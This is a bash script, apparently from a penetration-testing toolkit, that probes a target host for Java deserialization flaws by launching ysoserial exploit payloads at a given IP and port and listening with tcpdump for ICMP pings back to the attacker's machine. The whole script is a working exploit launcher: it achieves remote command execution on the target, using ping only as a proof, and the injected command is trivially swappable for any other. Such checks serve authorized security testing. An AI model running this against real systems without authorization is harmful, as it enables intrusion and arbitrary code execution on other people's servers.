#!/usr/bin/env bash

print_title() {
        BOLD=$(tput bold ; tput setaf 4)
        NORMAL=$(tput sgr0)
        echo "${BOLD} $1 ${NORMAL}"
}

print_info() {
        BOLD=$(tput bold)
        BLUE=$(tput setaf 4)
        NORMAL=$(tput sgr0)
        echo "${BOLD}${BLUE}[~] ${NORMAL}${BLUE}$1 ${NORMAL}"
}


EXPLOIT=$1
IP=$2
PORT=$3
PAYLOAD=$4
LOCALIP=$5

echo
echo
print_title "======================================================="
print_title "Java Deserialization Vulnerability Check with Ysoserial"
print_title "======================================================="
echo

print_info "WARNING: This attack box must be reachable from the target !"
echo
print_info "Checking Ysoserial ${PAYLOAD} payload..."
print_info "Will try to ping local IP = ${LOCALIP} from target"

print_info "Running tcpdump in background to try to capture ICMP requests if service is vuln..."
sudo sh -c "tcpdump -U -i any -w /tmp/dump.pcap icmp &"

print_info "Running ysoserial command for target Linux"
print_info "java -cp ysoserial-master.jar ${EXPLOIT} ${IP} ${PORT} ${PAYLOAD} \"/bin/ping -c 4 ${LOCALIP}\""
java -cp ysoserial-master.jar ${EXPLOIT} ${IP} ${PORT} ${PAYLOAD} "/bin/ping -c 4 ${LOCALIP}"

# print_info "Wait a little bit..."
# sleep 3
# PID=$(ps -e | pgrep tcpdump)
# print_info "Kill tcpdump (PID=${PID})"
# sudo kill -9 $PID 
# sleep 2

# print_info "Captured ICMP traffic:"
# echo
# sudo tcpdump -r /tmp/dump.pcap
# echo

# print_info "Delete capture"
# sudo rm /tmp/dump.pcap

# print_info "Restart tcpdump..."
# sudo sh -c "tcpdump -U -i any -w /tmp/dump.pcap icmp &"

print_info "Running ysoserial command for target Windows"
print_info "java -cp ysoserial-master.jar ${EXPLOIT} ${IP} ${PORT} ${PAYLOAD} \"ping -n 4 ${LOCALIP}\""
java -cp ysoserial-master.jar ${EXPLOIT} ${IP} ${PORT} ${PAYLOAD} "ping -n 4 ${LOCALIP}"

print_info "Wait a little bit..."
sleep 3
PID=$(ps -e | pgrep tcpdump)

print_info "Kill tcpdump (PID=${PID})"
sudo kill -9 $PID 
sleep 2

print_info "Captured ICMP traffic:"
echo
sudo tcpdump -r /tmp/dump.pcap
echo
print_info "Delete capture"
sudo rm /tmp/dump.pcap
